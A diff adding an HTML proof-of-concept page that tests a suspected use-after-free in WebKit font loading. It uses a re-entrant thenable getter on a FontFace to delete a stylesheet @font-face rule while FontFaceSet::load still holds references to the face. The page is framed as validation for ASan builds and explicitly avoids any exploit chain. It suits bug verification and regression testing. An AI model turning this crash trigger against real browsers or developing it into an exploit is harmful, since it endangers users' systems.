@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>CSSFontFace reference_wrapper lifetime validation</title>
+
+<!--
+Safe validation PoC for a suspected CSSFontFace lifetime bug.
+
+Goal:
+  Exercise this source-level pattern in vulnerable WebKit trees:
+
+    CSSFontFaceSet::matchingFacesExcludingPreinstalledFonts()
+      -> Vector<std::reference_wrapper<CSSFontFace>>
+    FontFaceSet::load()
+      -> stores matchingFaces
+      -> face.get().load()
+      -> synchronous FontFace promise / thenable re-entry
+      -> stylesheet @font-face deletion + forced style recalc
+      -> CSSFontFaceSet::remove() for the CSS-backed face
+      -> FontFaceSet::load() continues using matchingFaces
+
+Non-goals:
+  - No exploit chain
+  - No heap spray
+  - No fake objects / addrof / ARW / ROP / JOP / shellcode
+  - No sandbox escape or code execution attempt
+
+Expected signal on an affected ASan/debug build:
+  - crash, assertion, or ASan use-after-free report involving CSSFontFace,
+    FontFaceSet::load, CSSFontFaceSet::remove, or related font-loading code.
+
+If the build is patched or timing differs:
+  - the page may simply print PASS/NO CRASH.
+-->
+
+<style id="s">
+@font-face {
+    font-family: "lf-cssfontface-validation";
+    src: local("Helvetica");
+    unicode-range: U+0042; /* B: stylesheet-backed CSSFontFace */
+}
+</style>
+
+<div id="probe" style="font-family: 'lf-cssfontface-validation';">AB</div>
+<pre id="log"></pre>
+
+<script>
+(function () {
+    "use strict";
+
+    if (window.testRunner) {
+        testRunner.dumpAsText();
+        testRunner.waitUntilDone();
+    }
+
+    const logElement = document.getElementById("log");
+    function log(message) {
+        logElement.textContent += message + "\n";
+        if (window.console)
+            console.log(message);
+    }
+
+    log("Starting CSSFontFace reference_wrapper lifetime validation.");
+
+    const sheetElement = document.getElementById("s");
+    const sheet = sheetElement.sheet;
+    let reentered = false;
+
+    // A: JavaScript-created local FontFace. It covers U+0041 ('A').
+    // The stylesheet-backed @font-face above covers U+0042 ('B').
+    // Loading text "AB" should make FontFaceSet::load() collect both faces.
+    const jsFace = new FontFace(
+        "lf-cssfontface-validation",
+        "local(Helvetica)",
+        { unicodeRange: "U+0041" }
+    );
+
+    document.fonts.add(jsFace);
+    log("Added one JS-created local FontFace for U+0041.");
+
+    // Promise resolution of FontFace.loaded can inspect the resolved value as a
+    // thenable. This getter is the controlled re-entry point. It mutates the
+    // stylesheet-backed @font-face and forces style recalculation while
+    // FontFaceSet::load() is expected to still hold matchingFaces.
+    Object.defineProperty(jsFace, "then", {
+        configurable: true,
+        get() {
+            if (reentered)
+                return undefined;
+            reentered = true;
+
+            log("then getter re-entered: deleting stylesheet @font-face rule.");
+            try {
+                if (sheet && sheet.cssRules.length)
+                    sheet.deleteRule(0);
+                else
+                    log("No stylesheet rule available to delete.");
+            } catch (e) {
+                log("deleteRule threw: " + e.name + ": " + e.message);
+            }
+
+            // Force style/layout update so the deleted @font-face rule is
+            // reflected in the CSSFontSelector/CSSFontFaceSet synchronously.
+            try {
+                void document.body.offsetTop;
+                void getComputedStyle(document.getElementById("probe")).fontFamily;
+                log("Forced style/layout recalculation after rule deletion.");
+            } catch (e) {
+                log("Style/layout force threw: " + e.name + ": " + e.message);
+            }
+
+            return undefined;
+        }
+    });
+
+    log("Installed controlled then getter on JS FontFace.");
+
+    try {
+        // Request both A and B. A should map to jsFace. B should map to the
+        // stylesheet-backed CSSFontFace. The vulnerable shape is that B remains
+        // in matchingFaces as a non-owning reference after stylesheet mutation.
+        const loadPromise = document.fonts.load("1em lf-cssfontface-validation", "AB");
+        log("Called document.fonts.load(..., 'AB').");
+
+        loadPromise.then(
+            faces => {
+                log("document.fonts.load resolved with " + faces.length + " face(s).");
+                log("Re-entry observed: " + reentered);
+                log("Remaining stylesheet rule count: " + (sheet ? sheet.cssRules.length : "no sheet"));
+                log("NO CRASH in this run. On a patched build this is expected; on an affected build, ASan/debug may still be needed for a clear signal.");
+                if (window.testRunner)
+                    testRunner.notifyDone();
+            },
+            error => {
+                log("document.fonts.load rejected: " + error.name + ": " + error.message);
+                log("Re-entry observed: " + reentered);
+                if (window.testRunner)
+                    testRunner.notifyDone();
+            }
+        );
+    } catch (e) {
+        log("Synchronous exception from document.fonts.load: " + e.name + ": " + e.message);
+        log("Re-entry observed: " + reentered);
+        if (window.testRunner)
+            testRunner.notifyDone();
+    }
+
+    // Safety timeout for LayoutTest-style execution.
+    setTimeout(() => {
+        log("Timeout reached. Re-entry observed: " + reentered);
+        if (window.testRunner)
+            testRunner.notifyDone();
+    }, 1000);
+})();
+</script>
